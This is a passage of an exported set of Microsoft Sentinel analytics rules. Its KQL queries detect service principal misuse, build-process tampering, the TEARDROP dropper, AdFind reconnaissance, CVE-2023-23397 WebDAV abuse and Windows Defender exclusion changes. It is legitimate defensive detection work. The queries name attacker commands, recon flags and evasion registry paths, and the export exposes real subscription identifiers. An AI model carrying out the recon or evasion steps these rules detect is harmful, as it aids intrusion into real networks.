Location","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"ServicePrincipalName"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Service Principal Authentication Attempt from New Country","enabled":true,"description":"Detects when there is a Service Principal login attempt from a country that has not seen a successful login in the previous 14 days.\n  Threat actors may attempt to authenticate with credentials from compromised accounts - monitoring attempts from anomalous locations may help identify these attempts.\n  Authentication attempts should be investigated to ensure the activity was legitimate and if there is other similar activity.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":"1baaaf00-655f-4de9-8ff8-312e902cda71","lastModifiedUtc":"2024-10-02T21:10:56.6630906Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/0b03ed1f-a42d-457e-b39c-4aa0a812656a","name":"0b03ed1f-a42d-457e-b39c-4aa0a812656a","etag":"\"6f0935ed-0000-2700-0000-669976a80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// How far back to look for events from\nlet timeframe = 1d;\n// How close together build events and file modifications should occur to alert (make this smaller to reduce FPs)\nlet time_window = 5m;\n// Edit this to include build processes used\nlet build_processes = dynamic([\"MSBuild.exe\", \"dotnet.exe\", \"VBCSCompiler.exe\"]);\n// Include any processes that you want to allow to edit files during/around the build process\nlet allow_list = dynamic([]);\nDeviceProcessEvents\n| where TimeGenerated > ago(timeframe)\n// Look for build process starts\n| where FileName has_any (build_processes)\n| summarize by BuildParentProcess=InitiatingProcessFileName, BuildProcess=FileName, BuildAccount = AccountName, DeviceName, BuildCommand=ProcessCommandLine, \ntimekey= bin(TimeGenerated, time_window), BuildProcessTime=TimeGenerated\n| join kind=inner(\nDeviceFileEvents\n| where TimeGenerated > ago(timeframe)\n| where InitiatingProcessFileName !in (allow_list)\n| where ActionType == \"FileCreated\"  or ActionType == \"FileModified\"\n// Look for code files, edit this to include file extensions used in build.\n| where FileName endswith \".cs\" or FileName endswith \".cpp\"\n| summarize by FileEditParentProcess=InitiatingProcessParentFileName, FileEditAccount = InitiatingProcessAccountName, FileEditDomain = InitiatingProcessAccountDomain, FileEditUpn = InitiatingProcessAccountUpn, \nDeviceName, FileEdited=FileName, FileEditProcess=InitiatingProcessFileName, timekey= bin(TimeGenerated, time_window), FileEditTime=TimeGenerated)\n// join where build processes and file modifications seen at same time on same host\non timekey, DeviceName\n// Limit to only where the file edit happens after the build process starts\n| where BuildProcessTime <= FileEditTime\n| summarize make_set(FileEdited), make_set(FileEditProcess) by timekey, DeviceName, BuildParentProcess, BuildProcess, FileEditAccount, FileEditDomain, FileEditUpn\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"FileEditUpn"},{"identifier":"Name","columnName":"FileEditAccount"},{"identifier":"UPNSuffix","columnName":"FileEditDomain"}]}],"templateVersion":"1.1.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1554"],"displayName":"Potential Build Process Compromise - MDE","enabled":true,"description":"The query looks for source code files being modified immediately after a build process is started. The purpose of this is to look for malicious code injection during the build process. This query uses Microsoft Defender for Endpoint telemetry.\nMore details: https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-the-software-supply-chain-with-azure-sentinel/ba-p/2176463","alertRuleTemplateName":"1bf6e165-5e32-420e-ab4f-0da8558a8be2","lastModifiedUtc":"2024-07-18T20:10:15.1489853Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/aee5aa3c-56bf-481e-9314-1be1a22e2e43","name":"aee5aa3c-56bf-481e-9314-1be1a22e2e43","etag":"\"86005ab1-0000-2700-0000-66fdb6fc0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\n  | where OperationName has_all (\"member to role\", \"add\")\n  | where Result =~ \"Success\"\n  | extend type_ = tostring(TargetResources[0].type)\n  | where type_ =~ \"ServicePrincipal\"\n  | where isnotempty(TargetResources)\n  | extend ServicePrincipal = tostring(TargetResources[0].displayName)\n  | extend SPID = tostring(TargetResources[0].id)\n  | mv-expand TargetResources[0].modifiedProperties\n  | extend TargetResources_0_modifiedProperties = columnifexists(\"TargetResources_0_modifiedProperties\", '')\n  | where isnotempty(TargetResources_0_modifiedProperties)\n  | where TargetResources_0_modifiedProperties.displayName =~ \"Role.DisplayName\"\n  | extend TargetRole = parse_json(tostring(TargetResources_0_modifiedProperties.newValue))\n  | where TargetRole contains \"admin\"\n  | extend AddedByApp = iif(\n  isnotempty(tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalName)),\n  tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalName),\n  tostring(parse_json(tostring(InitiatedBy.app)).displayName)\n  )\n  | extend AddedByUser = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend AddedBy = iif(isnotempty(AddedByApp), AddedByApp, AddedByUser)\n  | extend IpAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n  | project-reorder TimeGenerated, ServicePrincipal, SPID, TargetRole, AddedBy, IpAddress\n  | project-away AddedByApp, AddedByUser","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"SPID"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AddedBy"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Service Principal Assigned Privileged Role","enabled":true,"description":"Detects a privileged role being added to a Service Principal.\n  Ensure that any assignment to a Service Principal is valid and appropriate - Service Principals should not be assigned to very highly privileged roles such as Global Admin.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0004;T1098;T1098.003","alertRuleTemplateName":"84cccc86-5c11-4b3a-aca6-7c8f738ed0f7","lastModifiedUtc":"2024-10-02T21:11:21.3925814Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/65a6c028-35c7-43c7-a109-e33bf8846db7","name":"65a6c028-35c7-43c7-a109-e33bf8846db7","etag":"\"86006ed1-0000-2700-0000-66fdb8db0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let admin_users = (IdentityInfo\n  | where TimeGenerated > ago(2d)\n  | summarize arg_max(TimeGenerated, *) by AccountUPN\n  | where AssignedRoles contains \"admin\" or GroupMembership has \"Admin\"\n  | summarize by tolower(AccountUPN));\n  AuditLogs\n  | where Category =~ \"RoleManagement\"\n  | where OperationName has \"Add eligible member\"\n  | extend TargetUserPrincipalName = tostring(TargetResources[0].userPrincipalName)\n  | where tolower(TargetUserPrincipalName) in (admin_users)\n  | extend TargetAadUserId = tostring(TargetResources[0].id)\n  | extend Group = tostring(TargetResources[0].displayName)\n  | extend RoleAddedTo = iif(isnotempty(TargetUserPrincipalName), TargetUserPrincipalName, Group)\n  | extend mod_props = TargetResources[0].modifiedProperties\n  | extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n  | extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n  | extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n  | extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n  | extend InitiatingIPAddress = tostring(InitiatedBy.user.ipAddress)\n  | extend RoleAddedBy = iif(isnotempty(InitiatingAppName), InitiatingAppName, InitiatingUserPrincipalName)\n  | mv-expand mod_props\n  | where mod_props.displayName == \"Role.DisplayName\"\n  | extend UserAgent = tostring(AdditionalDetails[0].value)\n  | extend RoleAdded = tostring(parse_json(tostring(mod_props.newValue)))\n  | extend TargetAccountName = tostring(split(TargetUserPrincipalName, \"@\")[0]), TargetAccountUPNSuffix = tostring(split(TargetUserPrincipalName, \"@\")[1])\n  | extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n  | project-reorder TimeGenerated, OperationName, TargetUserPrincipalName, RoleAddedTo, RoleAdded, RoleAddedBy, InitiatingUserPrincipalName, InitiatingAppName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserPrincipalName"},{"identifier":"Name","columnName":"TargetAccountName"},{"identifier":"UPNSuffix","columnName":"TargetAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"TargetAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]}],"templateVersion":"1.0.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Privileged Account Permissions Changed","enabled":true,"description":"Detects changes to permissions assigned to admin users. Threat actors may try and increase permission scope by adding additional roles to already privileged accounts.\nReview any modifications to ensure they were made legitimately.\nRef: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0004;T1098;T1098.003","alertRuleTemplateName":"0433c8a3-9aa6-4577-beef-2ea23be41137","lastModifiedUtc":"2024-10-02T21:19:15.6480494Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c66ab115-e3c9-4905-87ff-344bf407ef4a","name":"c66ab115-e3c9-4905-87ff-344bf407ef4a","etag":"\"850081eb-0000-2700-0000-66fdacd20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"DeviceEvents\n| where ActionType has \"ExploitGuardNonMicrosoftSignedBlocked\"\n| where InitiatingProcessFileName has \"svchost.exe\" and FileName has \"NetSetupSvc.dll\"\n| extend HashAlgorithm = \"SHA1\"\n| extend HostName = tostring(split(DeviceName, \".\")[0]), DomainIndex = toint(indexof(DeviceName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(DeviceName, DomainIndex + 1), DeviceName)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountUpn"},{"identifier":"Name","columnName":"InitiatingProcessAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingProcessAccountDomain"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"HashAlgorithm"},{"identifier":"Value","columnName":"InitiatingProcessSHA1"}]}],"templateVersion":"1.0.6","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","Persistence","DefenseEvasion"],"techniques":["T1543","T1059","T1027"],"displayName":"TEARDROP memory-only dropper","enabled":true,"description":"Identifies SolarWinds TEARDROP memory-only dropper IOCs in Window's defender Exploit Guard activity\nReferences:\n- https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\n- https://gist.github.com/olafhartong/71ffdd4cab4b6acd5cbcd1a0691ff82f\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0002;T1059,TA0003;T1543,TA0005;T1027","alertRuleTemplateName":"738702fd-0a66-42c7-8586-e30f0583f8fe","lastModifiedUtc":"2024-10-02T20:28:02.1668745Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5e3eb58d-c366-4d2c-ac8f-b552d232a6e7","name":"5e3eb58d-c366-4d2c-ac8f-b552d232a6e7","etag":"\"ec00dca5-0000-2700-0000-65f0800d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":1,"severity":"Low","query":"let tokens = dynamic([\"416\",\"208\",\"192\",\"128\",\"120\",\"96\",\"80\",\"72\",\"64\",\"48\",\"44\",\"40\",\"nc12\",\"nc24\",\"nv24\"]);\nlet operationList = dynamic([\"microsoft.compute/virtualmachines/write\", \"microsoft.resources/deployments/write\"]);\nAzureActivity\n| where OperationNameValue in~ (operationList)\n| where ActivityStatusValue startswith \"Accept\"\n| where Properties has 'vmSize'\n| extend parsed_property= parse_json(tostring((parse_json(Properties).responseBody))).properties\n| extend vmSize = tostring((parsed_property.hardwareProfile).vmSize)\n| mv-apply token=tokens to typeof(string) on (where vmSize contains token)\n| extend ComputerName = tostring((parsed_property.osProfile).computerName)\n| project TimeGenerated, OperationNameValue, ActivityStatusValue, Caller, CallerIpAddress, ComputerName, vmSize\n| extend Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"ComputerName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"templateVersion":"2.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1578"],"displayName":"Creation of expensive computes in Azure","enabled":true,"description":"Identifies the creation of large size or expensive VMs (with GPUs or with a large number of virtual CPUs) in Azure.\nAn adversary may create new or update existing virtual machines to evade defenses or use them for cryptomining purposes.\nFor Windows/Linux Vm Sizes, see https://docs.microsoft.com/azure/virtual-machines/windows/sizes \nAzure VM Naming Conventions, see https://docs.microsoft.com/azure/virtual-machines/vm-naming-conventions","alertRuleTemplateName":"9736e5f1-7b6e-4bfb-a708-e53ff1d182c3","lastModifiedUtc":"2024-03-12T16:17:17.3484501Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/694408b8-95ce-416e-927a-cf0c06457e82","name":"694408b8-95ce-416e-927a-cf0c06457e82","etag":"\"86008ec6-0000-2700-0000-66fdb8260000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let args = dynamic([\"objectcategory\",\"domainlist\",\"dcmodes\",\"adinfo\",\"trustdmp\",\"computers_pwdnotreqd\",\"Domain Admins\", \"objectcategory=person\", \"objectcategory=computer\", \"objectcategory=*\",\"dclist\"]);\nlet parentProcesses = dynamic([\"pwsh.exe\",\"powershell.exe\",\"cmd.exe\"]);\nDeviceProcessEvents\n//looks for execution from a shell\n| where InitiatingProcessFileName in~ (parentProcesses)\n// main filter\n| where FileName =~ \"AdFind.exe\" or SHA256 == \"c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3\"\n   // AdFind common Flags to check for from various threat actor TTPs\n    or ProcessCommandLine has_any (args)\n| extend HostName = split(DeviceName, '.', 0)[0], DnsDomain = strcat_array(array_slice(split(DeviceName, '.'), 1, -1), '.'), FileHashAlgorithm = \"SHA256\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"AccountName"},{"identifier":"UPNSuffix","columnName":"AccountDomain"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"DnsDomain"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"InitiatingProcessFileName"},{"identifier":"CommandLine","columnName":"ProcessCommandLine"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"FileHashAlgorithm"},{"identifier":"Value","columnName":"SHA256"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Discovery"],"techniques":["T1016","T1018","T1069","T1087","T1482"],"displayName":"Probable AdFind Recon Tool Usage","enabled":true,"description":"This query identifies the host and account that executed AdFind, by hash and filename, in addition to the flags commonly utilized by various threat actors during the reconnaissance phase.\nPLATFORM:Microsoft 365\nMITRE:TA0007;T1087;T1087.003;T1087.004","alertRuleTemplateName":"c63ae777-d5e0-4113-8c9a-c2c9d3d09fcd","lastModifiedUtc":"2024-10-02T21:16:19.3013436Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/644f4985-2577-4299-9f20-d2b83a88718b","name":"644f4985-2577-4299-9f20-d2b83a88718b","etag":"\"870031fc-0000-2700-0000-66fdcc3c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Author: Rob Russell\r\n// Description:\r\n// Looks for suspicious webDav client execution. This analytic was built to address MS 0 day related to CVE-2023-23397.\r\n// If the external address contacted is a public IP or non .mil or .gov domain it will fire.\r\n// https://www.huntress.com/blog/everything-we-know-about-cve-2023-23397\r\n// https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml\r\n// False Positives: No false positives known at this time. It should produce alerts with high condifence. \r\nlet Dav_string = @\"rundll32.exe C:\\WINDOWS\\system32\\davclnt.dll,DavSetCookie\";\r\nlet Http_regex = @\"(http:.*)\";\r\nlet IP_regex = @\"([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})\";\r\nlet Domain_regex=@\"(rundll32\\.exe C:\\\\WINDOWS\\\\system32\\\\davclnt\\.dll,DavSetCookie )(([a-z\\-0-9\\.]+ )(((?P<protocol>[a-z]{2,6})?:\\/\\/)?)(?P<subdomain>([a-z0-9]{0,10}\\.{1}){0,5}(?P<domain>[a-z\\-0-9]{1,30}){1})\\.{1}(?P<extention>[a-z]{1,10}){1})(?P<path>/.+$)\";\r\nlet Allowed_TLD = dynamic(['mil','gov']);\r\nlet Parse_url = (parse_string:string){extract(Http_regex,0,parse_string, typeof(string))};\r\nlet Parse_IP = (parse_string:string){extract(IP_regex,0,parse_string, typeof(string))};\r\nlet Parse_domain = (parse_string:string){(extract_all(Domain_regex,dynamic (['domain', 'extention']), parse_string))[0]};\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\nDeviceProcessEvents\r\n| where (ProcessCommandLine startswith Dav_string\r\n  or InitiatingProcessCommandLine startswith Dav_string)\r\n  and (ProcessCommandLine endswith \"wav\"\r\n  or InitiatingProcessCommandLine endswith \"wav\")\r\n| extend In_process_cmd = iff(ProcessCommandLine startswith Dav_string, true, false) // checks to see if it is in ProcessCommandLine or InitiatingProcessCommandLine\r\n| extend Url_data = iff(In_process_cmd, Parse_url(ProcessCommandLine), Parse_url(InitiatingProcessCommandLine))\r\n| extend IP_data = iff (In_process_cmd, Parse_IP(ProcessCommandLine),Parse_IP(InitiatingProcessCommandLine))\r\n| extend Is_public_IP = iff(IP_data!=\"\" and not(ipv4_is_private(IP_data)), true, false)\r\n| extend Domain_data = iff (In_process_cmd, Parse_domain(ProcessCommandLine), Parse_domain(InitiatingProcessCommandLine))\r\n| where ((ipv4_is_private(IP_data)==false) and (isnotempty(IP_data))) or\r\n    (not(Domain_data[1] has_any (Allowed_TLD)) and (isnotempty(Domain_data[1]))) // remove not at beginning of line to test against prod data on 7-April 2023\r\n| extend Domain_Contacted = strcat_array(Domain_data, \".\")\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project TimeGenerated, AccountName, UserPrincipalName, DeviceName, IP_Contacted = IP_data , Domain_Contacted, ProcessCommandLine, InitiatingProcessCommandLine","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","PrivilegeEscalation","DefenseEvasion","CredentialAccess","LateralMovement","CommandAndControl"],"techniques":["T1059","T1055","T1036","T1003","T1021","T1071"],"displayName":"BAH_Defender_Suspicious_WebDav_Client_Execution","enabled":true,"description":"/ Looks for suspicious webDav client execution. This analytic was built to address MS 0 day related to CVE-2023-23397.\n// If the external address contacted is a public IP or non .mil or .gov domain it will fire.\n// https://www.huntress.com/blog/everything-we-know-about-cve-2023-23397\n// https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml\n// False Positives: No false positives known at this time. It should produce alerts with high confidence.  This rule focuses on identifying cases where rundll32.exe is used to load the WebDAV client (davclnt.dll) in a suspicious context.\nPLATFORM:Azure AD,Windows,IaaS\nMITRE:TA0010;T1048","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:42:03.9630535Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8163e8ee-7ce4-4f6f-8756-4e039d16050f","name":"8163e8ee-7ce4-4f6f-8756-4e039d16050f","etag":"\"870004cb-0000-2700-0000-66fdc9010000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_MosaicLoader\r\n//Description: Looks for attempts to create Windows Defender exclusions through registry value keys being set in various different methods (e.g., PowerShell, Registry key value modifications, and via Defender Security Panel. Catches on exclusion paths, extensions, and processes.\r\n//Author: Steven Wan\r\n//False Positives: None applicable at this time.\r\n\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\nDeviceRegistryEvents\r\n| where TimeGenerated >= ago(1d)\r\n| where ((ActionType == \"RegistryValueSet\") and (RegistryKey startswith @\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" \r\n  or RegistryKey startswith @\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions\"\r\n  or RegistryKey startswith @\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes\"))\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for signin lookup by device will find last user signed into device if it was in the last 24 hours\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI // this join will add UserPrincipalName from here forward based on device name\r\n| project TimeGenerated, InitiatingProcessAccountName, UserPrincipalName, ActionType,  DeviceId, DeviceName, RegistryKey, RegistryValueName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl"],"techniques":[],"displayName":"BAH_MosaicLoader","enabled":true,"description":"Looks for attempts to create Windows Defender exclusions through registry value keys being set in various different methods (e.g., PowerShell, Registry key value modifications, and via Defender Control Panel. Catches on exclusion paths, extensions, and processes.\nPLATFORM:Windows\nMITRE:TA0005;T1112","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:28:13.7072368Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/9839a523-c705-4175-9a62-2c8d78961385","name":"9839a523-c705-4175-9a62-2c8d78961385","etag":"\"2d00b28d-0000-2700-0000-64e4ad980000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"//Author: Ginna Woo\r\n//Description: SharePointFileOperation - Looks at sharepoint file operations targeting users specific uploads and downloads of files exceeding 50 threshold on an unseen IP. Identifies when the volume of documents uploaded to or downloaded from Sharepoint by new IP addresses exceeds a threshold (default is 50).\r\n//False Positives: None known\r\nlet threshold = 5; //FILE DOWNLOAD/UPLOAD THESHOULD\r\nlet szSharePointFileOperation = \"SharePointFileOperation\"; //can add other RecordType as 